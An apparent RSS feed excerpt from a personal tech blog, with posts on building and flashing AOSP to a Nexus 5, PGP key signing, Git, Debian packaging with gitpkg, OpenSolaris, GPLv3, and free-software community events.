+<p>Prep your OS and install any dependencies. At the minimum you’re going to need java, python, C/C++, make, and git so make sure they’re installed using your favorite package manager. If you’re on Debian/Ubuntu, you’d run something similar to below:</p>
+<pre><code>sudo apt-get install openjdk-8-jdk git-core gnupg flex bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev ccache libgl1-mesa-dev libxml2-utils xsltproc unzip
+</code></pre>
+<p>If you find that you need something else down the line that&#x27;s not mentioned above, be a man/woman, and just apt-get it. Also, your package names may vary depending on your choice of distribution.</p>
+<p>Run the commands manually to do a quick sanity test that things are installed properly.</p>
+<p><strong>Step 2</strong></p>
+<p>Linux may require some configuration to udev to allow non-root users to work with USB devices, which is going to be required later on, so execute this command:</p>
+<pre><code>wget -S -O - http://source.android.com/source/51-android.rules | sed &quot;s/&lt;username&gt;/$USER/&quot; | sudo tee &gt;/dev/null /etc/udev/rules.d/51-android.rules; sudo udevadm control --reload-rules
+</code></pre>
+<p><strong>Step 3 (Optional)</strong></p>
+<p>Setup ccache to get extract some performance out of the build, by putting the following into your .bashrc:</p>
+<pre><code>export USE_CCACHE=1
+export CCACHE_DIR=/path/to/empty/ccache/directory/where/cache/is/kept
+</code></pre>
+<p>Set the cache size to 50G using the following:</p>
+<pre><code>prebuilts/misc/linux-x86/ccache/ccache -M 50G
+</code></pre>
+<p><strong>Step 4</strong></p>
+<p>The Android Open Source Project is a behemoth of a code base with multiple third party open source components and frameworks included such that it required its own layer on top of git just to manage the dependencies. That’s what** repo** is. On the positive side, it’s quite easy to get it working.</p>
+<p>Download the repo tool to your ~/bin directory as follows:</p>
+<pre><code>$ curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo
+$ chmod a+x ~/bin/repo
+</code></pre>
+<p>Make sure that ~/bin is in your $PATH. Type repo a few times and watch it barf in your face while saying:</p>
+<pre><code>error: repo is not installed.  Use &quot;repo init&quot; to install it here.
+</code></pre>
+<p>Do not fret, this is normal.</p>
+<p>You see, you have to initialize repo and give it a manifest which will tell repo where to download the source from and help it initialize itself. You do this by navigating to an empty directory and executing:</p>
+<pre><code>repo init -u https://android.googlesource.com/platform/manifest
+</code></pre>
+<p>If you do not specify a branch name with -b parameter, it will fetch the master branch, which is what we’re going to do here.</p>
+<p>You should now see an empty directory, apart from a .repo with the metadata that it downloaded from the manifest file. Now I’m assuming that you’re probably at home and do not have complicated proxy arrangements to get to the internet so I’m going to avoid talking about the HTTP_PROXY environment variable that you have to set if you do, but I guess it’s all redundant now that I’ve already said it, so I’m just going to move on:</p>
+<pre><code>repo sync
+</code></pre>
+<p>This will download the internet. This will run for an inordinate amount of time. A few things you can do while this executes:</p>
+<ul>
+<li>knit</li>
+<li>write a book</li>
+<li>have kids</li>
+<li>watch the poles melt</li>
+</ul>
+<p>A rough approximation, and the internet is very divided on this topic, is that it will require anywhere from 12 to 15 GB which will automatically expand to around 34GB on disk after it&#x27;s downloaded. In my experience, I&#x27;ve only been awake till about the 13GB mark, so didn&#x27;t quite get to see the transformation to its final glory. Add 50GB for the ccache and with some room to spare and you see why you need a lot of disk space to go through this.</p>
+<p>Now you wait.</p>
+<p><strong>Step 5</strong></p>
+<p>In my case, I needed to run the build on my Nexus 5. The AOSP source tree doesn&#x27;t have everything you need to build images specifically for Nexus 5, so I had to go to <a href="https://developers.google.com/android/nexus/drivers" target="_blank" rel="noopener noreferrer">this link</a>, scroll down to Nexus 5 and download the Broadcom, LG and Qualcomm binary blobs for the hardware on the Nexus 5. Put them in the root of the Android source tree, and execute it, where it self extracts. This is a needed step if you want to run the image on the device later on.</p>
+<p><strong>Step 6</strong></p>
+<p>Now comes the compilation step. This is actually the easiest part.</p>
+<p>Initialize the build environment by sourcing a script, you can use the bash source command or the good old dot command — whatever strikes your fancy:</p>
+<pre><code>. build/envsetup.sh
+</code></pre>
+<p>This will inject a bunch of build related environment variables to your current shell. Note that you have to run this in every shell that you want to run a build from.</p>
+<p>Next…</p>
+<pre><code>lunch
+</code></pre>
+<p>This will give a list of targets and allow you to select one. In my case, I selected “aosp_hammerhead-userdebug”. Hammerhead being the code name for the Nexus 5.</p>
+<p>One more step, and that’s to start the build.</p>
+<pre><code>time make -j4
+</code></pre>
+<p>You could easily just say “make”, but I would like to know how long the build took when it eventually finished running, and with the -j4 flag indicate the concurrency level for make (rule of thumb: 2 x number of cores). Now you can go for lunch.</p>
+<p>Things to do while this runs:</p>
+<ul>
+<li>Read Game of Thrones (all the books)</li>
+<li>Have a fabulous mid-life crisis</li>
+<li>Watch Lawrence of Arabia</li>
+</ul>
+<p>To be fair, it’s not that bad, just a few hours depending on your setup.</p>
+<p><strong>Step 7</strong></p>
+<p>Once the building is done, you will have a bunch of files under out/target/product/{device} which you can now start flashing.</p>
+<p>Connect your Android phone to the computer and assuming that all the drivers and Android SDK is setup (a dependency that I somehow failed to mention before), you should be able to run the following command:</p>
+<pre><code>adb reboot bootloader
+</code></pre>
+<p>This can also be achieved by shutting down the device and starting it while pressing a combination of buttons (such as volume down + power on the Nexus 5). This would put you into fastboot mode. On the fastboot screen, pay attention to whether the bootloader is locked or not, if it is, execute the following to unlock it:fastboot oem unlock</p>
+<p>This would wipe the data on the device. To further clean things up, execute the following:</p>
+<pre><code>fastboot format cache
+fastboot format userdata
+</code></pre>
+<p><strong>Step 8</strong></p>
+<p>Navigate once again to the out/target/product/{device} directory and execute the following to flash the built images to the device:</p>
+<pre><code>fastboot flash boot boot.img
+fastboot flash system system.img
+fastboot flash userdata userdata.img
+fastboot flash recovery recovery.img
+</code></pre>
+<p>Reboot the device and you’re all set.</p>
+<p>This is just the tip of the iceberg, and hopefully you’ll be able to now play with the internals of Android to understand how things are really stitched together. Good luck on your journey.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>On key signing and trust</title>
+      <link>https://weeraman.com/on-key-signing-and-trust</link>
+      <guid isPermaLink="true">https://weeraman.com/on-key-signing-and-trust</guid>
+      <pubDate>Sun, 11 Jan 2015 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[Key signing is a hallowed tradition in the open source world with a very specific protocol for validating and confirming an identity before accepting someone to the web of trust.]]></description>
+      <media:content url="https://weeraman.com/images/on-key-signing-and-trust/gpg-key-signing-cover.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/on-key-signing-and-trust/gpg-key-signing-cover.jpg" alt="On key signing and trust" /></figure><div><p>Key signing is a hallowed tradition in the open source world with a very specific protocol for validating and confirming an identity before accepting someone to the web of trust. It’s almost never done without meeting the person being admitted into the trust relationship and it goes like this:</p>
+<ol>
+<li>
+<p>Individuals meet for a beer, or at a key signing party (for those who just went wtf, yes, these things are real, and they are crazy fun! see below for the type of shenanigans that take place at these reality-altering parties)</p>
+</li>
+<li>
+<p>They exchange strips of paper or business cards with their name, email address, key fingerprint and key ID</p>
+</li>
+<li>
+<p>They validate each other’s identity using Government issued photo IDs</p>
+</li>
+<li>
+<p>Once cleared, they pull down each other’s key from the key servers</p>
+</li>
+<li>
+<p>They validate that the fingerprint of the downloaded key matches what’s written on the piece of paper and the photo IDs exchanged at introduction</p>
+</li>
+<li>
+<p>If everything checks out, they sign each other’s key</p>
+</li>
+<li>
+<p>For additional security, the signed key is encrypted using the public key of the recipient and emailed to the address indicated in the key
+Let’s look at this unnerving and highly nerdy exchange that has replaced the “Hi, I’m Tom” with “Hi, I’m Tom and here’s my fingerprint and Government issued photo Id”. Here’s the rationale for some of the steps in this workflow.</p>
+</li>
+</ol>
+<p>The key is a personal identification and privacy instrument that is backed by strong science to assure <a href="http://en.wikipedia.org/wiki/Non-repudiation" target="_blank" rel="noopener noreferrer">non-repudiation</a>. I will not go into the science in this post, but <a href="http://en.wikipedia.org/wiki/RSA_%28cryptosystem%29" target="_blank" rel="noopener noreferrer">here’s</a> where you may want to get started if you’re curious. An aspect about this workflow is that nothing is trusted until verified and the protocol is there to make sure that no compromise takes place.</p>
+<p>At the beginning of the process, the public key is expected to be on a public key server network (such as <a href="http://pgp.mit.edu/" target="_blank" rel="noopener noreferrer">pgp.mit.edu</a>) and the meeting in person is to make sure that the key you’re signing (which is on a public system) belongs to the correct individual and not to an individual (or three letter agency) who’s masquerading as someone else. The most secure way to ensure that is in person (because we’re a paranoid bunch), as that will eliminate any chance of a malicious man in the middle. When one produces the piece of paper with the key fingerprint (again backed by strong science) the signer is able to confirm by comparing the fingerprint on the public server with the fingerprint that’s presented in person along with the official photo id, that the public key really belongs to the individual before him/her. The connection has now been made and technology has once again prevailed in mathematically assured validation of another’s identity. The party is just getting started.</p>
+<p>Once identity is validated this way, the signer signs the key and uploads the key back to the key server or emails a copy of it. This can be done after the party in a more subdued setting without crazy paper shuffling and photo id validation madness. The astute and more paranoid amongst us, would encrypt it using the public key of the key being signed and email it to the address specified in the key because that’s a good way to validate the email address is correct and belongs to the right user. For the gnupg commands that make this workflow possible, check out the <a href="https://wiki.debian.org/Keysigning" target="_blank" rel="noopener noreferrer">Debian Key signing</a> howto.</p>
+<p>In communities such as <a href="http://www.debian.org" target="_blank" rel="noopener noreferrer">Debian</a>, this process is mandatory to assure the trust in a system that is largely de-centralized. The <a href="http://en.wikipedia.org/wiki/Web_of_trust" target="_blank" rel="noopener noreferrer">Web of Trust</a> that this creates gives rise to a truly magnificent network, which is difficult to subvert so long as the protocol is followed to ensure no compromise.</p>
+<p>While this is good for cryptographically assured validation of one’s identity in a global network and non-repudiation of one’s contributions and electronic communications, trust is ultimately a very subjective attribute and probably can never be assured through a hash, because trust can be broken by people even though strong science says otherwise.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Software Freedom Day 2013 @ Virtusa</title>
+      <link>https://weeraman.com/software-freedom-day-2013-virtusa</link>
+      <guid isPermaLink="true">https://weeraman.com/software-freedom-day-2013-virtusa</guid>
+      <pubDate>Sun, 22 Sep 2013 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[This last week, the fine folk at the Virtusa Open Source SIG organized an event to celebrate the Software Freedom Day where my good friends Mifan and Suchetha made keynotes.]]></description>
+      <media:content url="https://weeraman.com/images/software-freedom-day-2013-virtusa/stallman-bangalore-cover.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/software-freedom-day-2013-virtusa/stallman-bangalore-cover.jpg" alt="Software Freedom Day 2013 @ Virtusa" /></figure><div><p>This last week, the fine folk at the Virtusa Open Source SIG organized an event to celebrate the <a href="http://wiki.softwarefreedomday.org/2013/Sri%20Lanka/Colombo/Virtusa%20Open%20Source%20Interest%20Group" target="_blank" rel="noopener noreferrer">Software Freedom Day</a> where my good friends Mifan and Suchetha made keynotes. Also in attendance was Arunan, so it was a re-union of sorts with some old friends. It’s been a while since I have participated in anything open source / free software, and it was great to see the old flame is still alive at Virtusa, and I hope it helps in shaping their worldviews and brings as much purpose to them as it did to me more than 10 years ago.</p>
+<p>The last SFD I attended was in 2008. I blogged about it <a href="http://gnuromancer.org/2008/09/23/software-freedom-day-2008/" target="_blank" rel="noopener noreferrer">here</a> with some photos available in my surprisingly-still-around <a href="http://www.flickr.com/photos/aweeraman/sets/72157607461137693/" target="_blank" rel="noopener noreferrer">flickr</a> account. It was in Chinatown in Boston and I drove up from Pennsylvania, mostly to get my mind off things. It was there that I purchased a copy of “Free Software, Free Society”, a collection of essays by Richard Stallman. Five years later, I picked up the dusty book from my shelf and re-read the GNU manifesto, to get my mind back to the core principles.</p>
+<p>It was there, as I was flipping through the pages, that I saw RMS in a whole new light. His uncompromising tenacity in the face of control and oppression and unfaltering stance on ethics and morality of freedom. He is a true freedom fighter. His message sometimes gets lost in all the pandemonium we go through daily but the spirit of the freedom he preached is very much alive every time we believe that knowledge should be free and that everybody should have access to it. I hope this message continues to inspire folks for years to come.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Musings on Git</title>
+      <link>https://weeraman.com/musings-on-git</link>
+      <guid isPermaLink="true">https://weeraman.com/musings-on-git</guid>
+      <pubDate>Mon, 31 Dec 2012 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[Having spent some quality time with Git over the holidays, my appreciation for the flexibility of this DVCS and the elegance with which it has been constructed has reached a state of awe.]]></description>
+      <media:content url="https://weeraman.com/images/musings-on-git/version-control-dvcs.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/musings-on-git/version-control-dvcs.jpg" alt="Musings on Git" /></figure><div><p>Having spent some quality time with <a href="http://git-scm.com/" target="_blank" rel="noopener noreferrer">Git</a> over the holidays, my appreciation for the flexibility of this DVCS and the elegance with which it has been constructed has reached a state of awe. I remember following the BitKeeper debacle of 2005 on Kernel Traffic that spawned the project that would turn out to be git, and wondering why Linus would even think of going off on a tangent and building a VCS. I’m thankful that he did.</p>
+<p>In a mail to the LKML, Linus mentions:</p>
+<p>So I’m writing some scripts to try to track things a whole lot faster. Initial indications are that I should be able to do it almost as quickly as I can just apply the patch, but quite frankly, I’m at most half done, and if I hit a snag maybe that’s not true at all. Anyway, the reason I can do it quickly is that my scripts will not be an SCM, they’ll be a very specific “log Linus’ state” kind of thing. That will make the linear patch merge a lot more time-efficient, and thus possible.What I find interesting is his statement that “my scripts will not be an SCM” sounds a lot like <a href="https://groups.google.com/forum/?fromgroups=#!topic/comp.os.minix/dlNtH7RRrGA" target="_blank" rel="noopener noreferrer">“won’t be big and professional like gnu”</a> in an earlier mail to a different crowd. Pay attention when hackers sound humble and self deprecating. It’ll be easy to spot, since they’re not most of the time. I kid, of course.</p>
+<p>Having hacked on Linux for a long time, I believe Linus really enjoyed taking a break and doing something different, and <a href="http://www.youtube.com/watch?v=MShbP3OpASA" target="_blank" rel="noopener noreferrer">in this talk</a>, it’s clear that he was quite proud of his creation. It’s also very clear that the entire system was thought up by a kernel hacker from the focus on making the system fast and efficient, not to mention being able to do a “fsck” on the git repository also shows which analogies were drawn in designing git.</p>
+<p>Managing kernel contribution is a difficult process, and with over 1000 contributors to each kernel release makes it one of the most prolific open source projects in history. The benevolent dictator and the <a href="http://p2pfoundation.net/Linux_-_Governance#George_Dafermos_on_the_four-fold_structure" target="_blank" rel="noopener noreferrer">governance structure</a> that he’s laid out for the kernel over the years seems to be able to manage this complexity and scale efficiently. Git has played a major part of this success and I expect will continue to do so in the coming years.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Mahavilachchiya needs you!</title>
+      <link>https://weeraman.com/mahavilachchiya-needs-you</link>
+      <guid isPermaLink="true">https://weeraman.com/mahavilachchiya-needs-you</guid>
+      <pubDate>Thu, 23 Sep 2010 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[Several years ago, I got the opportunity to visit a small foundation in the middle of the jungle in Mahavilachchiya that made a strong impression on me and my friends in the LKLUG.]]></description>
+      <media:content url="https://weeraman.com/images/mahavilachchiya-needs-you/mahavilachchiya-school.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/mahavilachchiya-needs-you/mahavilachchiya-school.jpg" alt="Mahavilachchiya needs you!" /></figure><div><p>Several years ago, I got the opportunity to visit <a href="http://www.flickr.com/photos/aweeraman/sets/72157594341258104/" target="_blank" rel="noopener noreferrer">a small foundation in the middle of the jungle</a> in Mahavilachchiya that made a strong impression on me and my friends in the <a href="http://www.linux.lk" target="_blank" rel="noopener noreferrer">LKLUG</a>. We were there to teach kids computers and introduce them to the wealth of free and open source software. As an active community, we have been to many advocacy and training sessions, but this one was quite unlike any other.</p>
+<p>There was an element of danger going into a “border village” where the threat of terrorist attacks were ever imminent and the kids lived in fear. Despite the warnings we received from the elders, it was clear to all of us that this had to be done. And to this day, the only regret has been that we have not been able to do more.</p>
+<p>What we found in Mahavillachchiya was the most hopeful thing I’ve ever seen in the most hopeless of times under the worst circumstances. It was truly an oasis and a budding fertile ground for changing the lives of an entire generation in the region. A generation that had been ravaged by war and poverty and yet retained the innocence and hope to smile through the ordeal.</p>
+<p>Most of what we do in our lives are not important. The petty goals we strive to achieve, the victories that we expect to provide us with fulfillment in life, when examined more closely, pale in comparison to the selfless work performed by remarkable people to bring an entire generation out of a vicious cycle. Here’s a chance for you to do something truly worthwhile that will affect the lives of many.</p>
+<p>Mahavilachchiya and Horizon Lanka Foundation need your help. It needs to raise 1 million Rupees by the end of the year to meet its financial obligations and to continue its good work. The equivalent of 9,000 USD, this is the first step in helping the foundation continue to be the positive change agent to the hundreds of rural kids in Sri Lanka.</p>
+<p>If you would like to help with this initiative, please contact <a href="mailto:wanni@horizonlanka.net">Nandasiri Wanninayaka</a> (<a href="mailto:wanni@horizonlanka.net">wanni@horizonlanka.net</a>) to see how you can help. Wanni is the founder of this initiative and is a truly inspirational character.</p>
+<p>You can also contribute to HLF initiatives on <a href="http://www.globalgiving.org/projects/computer-education-sri-lanka/" target="_blank" rel="noopener noreferrer">GlobalGiving.org</a>.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Software Freedom Day 2008</title>
+      <link>https://weeraman.com/software-freedom-day-2008</link>
+      <guid isPermaLink="true">https://weeraman.com/software-freedom-day-2008</guid>
+      <pubDate>Wed, 24 Sep 2008 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[An event to mark the Software Freedom Day was organized by the Free Software Foundation and held in Boston over the weekend. I felt that a long drive was just what I needed to get my mind off the series of mini catastrophes that have been taking place at work during the week.]]></description>
+      <media:content url="https://weeraman.com/images/software-freedom-day-2008/sfd-2008-cover.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/software-freedom-day-2008/sfd-2008-cover.jpg" alt="Software Freedom Day 2008" /></figure><div><p>An event to mark the <a href="http://softwarefreedomday.org/" target="_blank" rel="noopener noreferrer">Software Freedom Day</a> was organized by the <a href="http://www.fsf.org/" target="_blank" rel="noopener noreferrer">Free Software Foundation</a> and held in <a href="http://www.encuentro5.org/" target="_blank" rel="noopener noreferrer">Boston</a> over the weekend. I felt that a long drive was just what I needed to get my mind off the series of mini catastrophes that have been taking place at work during the week.</p>
+<p>By the time I reached Chinatown, it was mid-day on Saturday and the event was nearly over. Helped myself to some GNU memorabilia, and briefly spoke with <a href="http://en.wikipedia.org/wiki/Benjamin_Mako_Hill" target="_blank" rel="noopener noreferrer">Mako</a> before being distracted by Stallman’s voice singing the Free Software song.</p>
+<p>GNU celebrates its 25th anniversary this year, and a small <a href="http://www.gnu.org/fry/" target="_blank" rel="noopener noreferrer">5-minute short</a> of <a href="http://en.wikipedia.org/wiki/Stephen_Fry" target="_blank" rel="noopener noreferrer">Stephen Fry</a> endorsing Free Software was screened. Happy birthday GNU, and many more!</p>
+<p>Some photos from the event can be found <a href="http://www.flickr.com/photos/aweeraman/sets/72157607461137693/" target="_blank" rel="noopener noreferrer">here</a>.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Debian packaging with git — Part 1</title>
+      <link>https://weeraman.com/debian-packaging-with-git-part-1</link>
+      <guid isPermaLink="true">https://weeraman.com/debian-packaging-with-git-part-1</guid>
+      <pubDate>Thu, 29 May 2008 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[Recently, I've been taking a look at tools to version control and maintain my Debian packages in git. Git, like mercurial, is a distributed SCM used to maintain the Linux kernel since version 2.6.12.]]></description>
+      <media:content url="https://weeraman.com/images/debian-packaging-with-git-part-1/packaging-software.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/debian-packaging-with-git-part-1/packaging-software.jpg" alt="Debian packaging with git — Part 1" /></figure><div><p>Recently, I’ve been taking a look at tools to version control and maintain my Debian packages in git.</p>
+<p>Git, like mercurial, is a distributed SCM used to maintain the Linux kernel since version 2.6.12. Branching in git is very cheap, and merging is trivial and follows a decentralized model where developers can push and pull code with each other in true distributed fashion.</p>
+<p>Of the Debian tools I&#x27;ve tried, the main contenders are:</p>
+<ul>
+<li>gitpkg</li>
+<li>git-buildpackage</li>
+</ul>
+<p>gitpkg, is extremely simple to use, and quick to get you off the ground. If you already have an entire revision history of .dsc, .diff.gz files, maintained in the good old fashioned way, gitpkg provides the git-debimport utility that lets you import everything into a git repository in one go. It does this intelligently by applying consecutive revisions and tagging the different versions along the way.</p>
+<p>Here are the steps that I took to import my ncc package history into git:</p>
+<pre><code class="language-bash">$ mkdir /git/repo
+$ cd /git/repo
+$ git-debimport ../../debian/ncc/ncc
+</code></pre>
+<p>It will then pick up all the files beginning with ncc in the ../../debian/ncc directory.</p>
+<p>To see the revision history:</p>
+<pre><code class="language-bash">$ cd ncc
+$ gitk
+</code></pre>
+<p>The .orig.tar.gz files will be extracted to a branch called upstream and tagged (v2.5), it will then be merged to master and the .diff.gz files applied sequentially and tagged at each step (v2.5–1). A list of tags like the following will be created:</p>
+<pre><code>v2.5
+v2.5–1
+v2.5–2
+v2.6
+v2.6–1
+v2.6–2
+</code></pre>
+<p>To create the source package for a particular revision:</p>
+<pre><code class="language-bash">gitpkg v2.6–1 v2.6
+</code></pre>
+<p>Where the first argument is the tag with the Debian changes, and the second argument is the tag for upstream code.</p>
+<pre><code class="language-bash">$ ls -F ../deb-packages/ncc/
+ncc-2.6/ ncc_2.6–1.diff.gz ncc_2.6–1.dsc ncc_2.6.orig.tar.gz
+
+$ cd ../deb-packages/ncc/ncc-2.6
+$ debuild
+</code></pre>
+<p>These steps didn&#x27;t work for me the first time as git silently dropped an empty directory that caused the build to fail. The workaround was to create a** .gitignore** file in the empty directory. This is probably something that gitpkg could be configured to handle.</p>
+<p>To upgrade to a new upstream version:</p>
+<pre><code class="language-bash">$ git checkout upstream
+$ rm -rf *
+$ tar zxvf /path/to/new/upstream.tar.gz
+$ git add .
+$ git commit -m &quot;Upgrade to v2.7&quot;
+$ git tag v2.7
+
+# Merge the Debian changes
+$ git checkout master
+$ git branch debian
+$ git checkout debian
+$ git merge upstream
+
+# Fix conflicts / make Debian specific changes / test
+$ git add .
+$ git commit -a
+$ git checkout master
+$ git merge debian
+$ git tag v2.7–1
+
+# Generate Debian package artifacts
+$ gitpkg v2.7–1 v2.7
+
+# Build Debian package
+$ cd ../deb-packages/ncc/ncc-2.7
+$ debuild
+</code></pre>
+<p>A couple of caveats — gitpkg generates the orig.tar.gz by tarring up the upstream branch. As far as I know, gitpkg does not yet have pristine-tar support yet and that&#x27;s a must-have if you don&#x27;t want to re-package the upstream sources. I also noticed that git-debimport had trouble with absolute paths, for which I submitted a patch — so I don&#x27;t have a whole lot of confidence in the tool yet, but it&#x27;s getting there.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>On OpenSolaris</title>
+      <link>https://weeraman.com/on-opensolaris</link>
+      <guid isPermaLink="true">https://weeraman.com/on-opensolaris</guid>
+      <pubDate>Sat, 26 Apr 2008 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[In a recent article, Ted T'so makes some interesting points on Sun's motives behind OpenSolaris, and how it fares today in the FOSS ecosystem as a result.]]></description>
+      <media:content url="https://weeraman.com/images/on-opensolaris/sun-opensolaris.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/on-opensolaris/sun-opensolaris.jpg" alt="On OpenSolaris" /></figure><div><p>In a <a href="http://thunk.org/tytso/blog/2008/04/19/what-sun-was-trying-to-do-with-open-solaris/" target="_blank" rel="noopener noreferrer">recent article</a>, Ted T’so makes some interesting points on Sun’s motives behind OpenSolaris, and how it fares today in the FOSS ecosystem as a result.</p>
+<p>Fundamentally, Open Solaris has been released under a Open Source license, but it is not an Open Source development community. It’s quite sad that this is the case simply considering the enormous potential that OpenSolaris had back in 2005, and the opportunities for cross pollination with Linux had the licenses been compatible. Given some of <a href="http://www.opensolaris.org/os/community/dtrace/" target="_blank" rel="noopener noreferrer">killer</a> <a href="http://opensolaris.org/os/community/zfs/" target="_blank" rel="noopener noreferrer">features</a> of the operating system, it’s quite a shame that it has not been able to rally the developer community that it deserves.</p>
+<p>At this point, I think the only hope for OpenSolaris is GPLv3 and a truly open development process. Then for once, Linus’ kernel will have a strong contender and a raised bar on licensing grounds.</p>
+<p><a href="http://www.nexenta.org/" target="_blank" rel="noopener noreferrer">Nexenta</a> (a project unaffiliated with Sun), and essentially a Debian distribution with an OpenSolaris kernel, has been a strong attempt at attracting developers. Debian is by far is the most developer friendly GNU/Linux distribution out there, with a mature and proven development model, and to build an OpenSolaris distribution with user land tools of Debian makes the most sense.</p>
+<p>I’ve been a Solaris user since version 6, which I attempted to run (quite foolishly) on a 333MHz Pentium. The user experience was anything but smooth, but still ended up gaining a lot of respect for the platform. Only time can say whether the tide changes for OpenSolaris or whether it ends up relegating to the Minix boat.</p>
+<p>Updated: 03 May — Corrections on Nexenta</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>GPLv3 Launch</title>
+      <link>https://weeraman.com/gplv3-launch</link>
+      <guid isPermaLink="true">https://weeraman.com/gplv3-launch</guid>
+      <pubDate>Sun, 01 Jul 2007 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[GPLv3 was launched on Friday after close to eighteen months of public involvement in it's drafting process. This has been an important milestone in the free software world as an upgrade to the GPL to address some of the more modern concerns have been a long time coming.]]></description>
+      <media:content url="https://weeraman.com/images/gplv3-launch/gplv3-launch-cover.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/gplv3-launch/gplv3-launch-cover.jpg" alt="GPLv3 Launch" /></figure><div><p>GPLv3 was <a href="https://www.fsf.org/news/gplv3_launched" target="_blank" rel="noopener noreferrer">launched</a> on Friday (29) after close to eighteen months of public involvement in it’s drafting process. This has been an important milestone in the free software world as an upgrade to the GPL to address some of the more modern concerns have been a long time coming. I think <a href="http://en.wikipedia.org/wiki/Bruce_Perens" target="_blank" rel="noopener noreferrer">Bruce Perens</a> sums this up well when he said:</p>
+<p>“When the GPLv2 and GPLv1 were written, we got music from phonograph records,” he says. “The most complicated input device people had in their homes was a touch-tone telephone. The only thing that was even close to digital rights management were these dongles you’d hang on the back of your computer that would authorize you to run software — digital rights management didn’t even really exist.”You can read the rest of the Wired article — <a href="http://www.wired.com/software/coolapps/news/2007/06/gpl3" target="_blank" rel="noopener noreferrer">here</a>.</p>
+<p>I was at the Free Software Foundation with a couple of my mates and you can find some of the photographs, <a href="http://flickr.com/photos/aweeraman/sets/72157600555500824/" target="_blank" rel="noopener noreferrer">here</a>. RMS made the announcement in a room rigged with audio equipment, so everyone was really quiet. In a room where the dropping of a pin could be heard, the shutter release of my DSLR came like claps of thunder. So I resorted to just watch the whole thing rather than draw the wrath of the assembled mob of free software types.</p>
+<p>GPLv3 has finally taken flight. It’ll be a lot of work to re-license all the GNU tools under GPLv3 but the process has already begun. It’ll be very interesting to see what happens.</p>
+<p><strong>Update (14 July)</strong>: The <a href="http://youtube.com/watch?v=WNknNScP0tg" target="_blank" rel="noopener noreferrer">announcement from RMS</a>.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Sahana receives FSF award</title>
+      <link>https://weeraman.com/sahana-receives-fsf-award</link>
+      <guid isPermaLink="true">https://weeraman.com/sahana-receives-fsf-award</guid>
+      <pubDate>Sun, 25 Mar 2007 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[I attended the 2007 FSF members meeting today, codenamed Year of the upgrade. Four members from the Sahana team were present at the meeting to receive the Free Software award for Project of Social Benefit.]]></description>
+      <media:content url="https://weeraman.com/images/sahana-receives-fsf-award/sahana-fsf-award-cover.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/sahana-receives-fsf-award/sahana-fsf-award-cover.jpg" alt="Sahana receives FSF award" /></figure><div><p>I attended the 2007 FSF members meeting today — codenamed “Year of the upgrade”.</p>
+<p>— snip —</p>
+<pre><code>09:15–10:00 Breakfast, registration, and pgp key signing
+10:00–10:25 Peter Brown, Executive Director — &quot;Libre Planet&quot;
+10:25–10:50 John Sullivan, Program Administrator -&quot;BadVista and the Campaign for Free Software Adoption&quot;
+10:50–11:05 Justin Baugh, Senior System Administrator — &quot;Hardware Free from Restrictions&quot;
+11:05–11:20 Joshua Ginsberg, Senior System Administrator — &quot;FSF Systems Administration&quot;
+11:20–11:35 Break
+11:35–12:10 Brett Smith, Licensing Engineer — &quot;Compliance and GPLv3&quot;
+12:10–12:50 Richard Stallman, President — &quot;Software Patents&quot;
+12:50–13:50 Lunch and mini-rockbox installfast
+13:50–14:40 Gerald Sussman, Director — &quot;Robust Design&quot;
+14:40–15:20 Eben Moglen, General Counsel — &quot;After GPLv3&quot;
+15:20–16:00 Board members panel and Q&amp;A — &quot;Year of the Upgrade&quot;
+16:00–16:15 Break
+16:15–17:30 Members Forum — including a presentation by Mako Hill on &quot;Defining Free Culture&quot;
+17:30–17:50 Free Software Awards Ceremony
+</code></pre>
+<p>— snip —</p>
+<p>Four members from the <a href="http://flickr.com/photos/aweeraman/tags/sahana/" target="_blank" rel="noopener noreferrer">Sahana team</a> (Chamindra, Pradeeper, Mifan and Ravindra) were present at the meeting to receive the <a href="http://en.wikipedia.org/wiki/Free_Software_Award_for_Projects_of_Social_Benefit" target="_blank" rel="noopener noreferrer">Free Software award for Project of Social Benefit</a>!! This is a truly great achievement, kudos to you all!</p>
